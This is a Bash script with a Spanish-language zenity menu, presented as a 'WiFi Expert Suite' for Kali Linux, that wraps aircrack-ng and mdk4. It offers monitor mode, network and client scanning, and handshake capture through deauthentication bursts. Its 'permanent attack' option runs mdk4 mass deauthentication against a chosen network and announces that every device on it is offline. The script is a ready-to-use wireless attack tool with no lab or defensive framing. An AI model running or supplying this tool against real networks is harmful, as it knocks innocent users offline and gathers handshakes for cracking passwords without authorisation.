#!/bin/bash
# WiFi Expert Suite v6.0 - Edición GUI Profesional

# Colores para la terminal de fondo
CYAN='\033[0;36m'; YELLOW='\033[1;33m'; RED='\033[0;31m'; NC='\033[0m'

while true; do
    # VENTANA PRINCIPAL DE SELECCIÓN
    CHOICE=$(zenity --list --title="📡 WiFi Expert Suite PRO" \
        --column="ID" --column="Acción" --column="Descripción" \
        --width=600 --height=500 \
        1 "⚡ Activar Modo Monitor" "Prepara la tarjeta para inyección" \
        2 "🌐 Desactivar Modo Monitor" "Restaura el Internet en Kali" \
        3 "📡 Escaneo General" "Ver todas las redes y sus BSSID" \
        4 "🔍 Rastreo Específico" "Ver dispositivos conectados a una MAC" \
        5 "🔑 Capturar Handshake" "Obtener clave cifrada de la red" \
        6 "🔥 ATAQUE PERMANENTE" "Desconexión TOTAL e INFINITA" \
        7 "❌ Salir" "Cerrar la herramienta")

    case $CHOICE in
        1) 
            INT=$(zenity --entry --text="Interfaz (ej: wlan0):" --entry-text="wlan0")
            pkexec airmon-ng start $INT | zenity --text-info --title="Activando..." --width=400 --height=200
            ;;
        2)
            pkexec airmon-ng stop wlan0mon && pkexec systemctl restart NetworkManager
            zenity --info --text="Modo Monitor desactivado. Internet restaurado." --width=300
            ;;
        3)
            gnome-terminal --geometry=100x25 --title="ESCANEO DE REDES" -- sh -c "sudo airodump-ng wlan0mon; exec bash"
            ;;
        4)
            BSSID=$(zenity --entry --text="Introduce BSSID del objetivo:")
            CANAL=$(zenity --entry --text="Introduce Canal:")
            gnome-terminal --title="RASTREANDO: $BSSID" -- sh -c "sudo airodump-ng --bssid $BSSID -c $CANAL wlan0mon; exec bash"
            ;;
        5)
            BSSID=$(zenity --entry --text="BSSID:")
            CANAL=$(zenity --entry --text="Canal:")
            FICHERO=$(zenity --entry --text="Nombre del archivo:" --entry-text="captura_pro")
            gnome-terminal --title="CAPTURANDO" -- sh -c "sudo airodump-ng --bssid $BSSID -c $CANAL -w $FICHERO wlan0mon; exec bash" &
            sleep 2
            xterm -e "sudo aireplay-ng -0 20 -a $BSSID wlan0mon"
            zenity --info --text="Ataque de desautenticación enviado. Revisa la terminal para ver el Handshake."
            ;;
        6)
            BSSID=$(zenity --entry --text="MAC (BSSID) a Bloquear:")
            CANAL=$(zenity --entry --text="Canal de la red:")
            
            # Lanzamos MDK4 en modo 'd' (deauth masivo)
            sudo mdk4 wlan0mon d -b <(echo $BSSID) -c $CANAL > /dev/null 2>&1 &
            ATAQUE_PID=$!
            
            # VENTANA DE CONTROL DE ATAQUE
            zenity --question --title="🔥 ATAQUE PERMANENTE ACTIVO" \
                   --text="ATACANDO A: $BSSID\n\nTodos los teléfonos, tablets y PCs están sin conexión.\n\n¿Deseas detener el bloqueo ahora?" \
                   --ok-label="DETENER Y LIBERAR RED" --cancel-label="MANTENER BLOQUEO"
            
            kill $ATAQUE_PID
            zenity --info --text="Ataque detenido. La red vuelve a la normalidad." --width=300
            ;;
        7) exit ;;
    esac
done
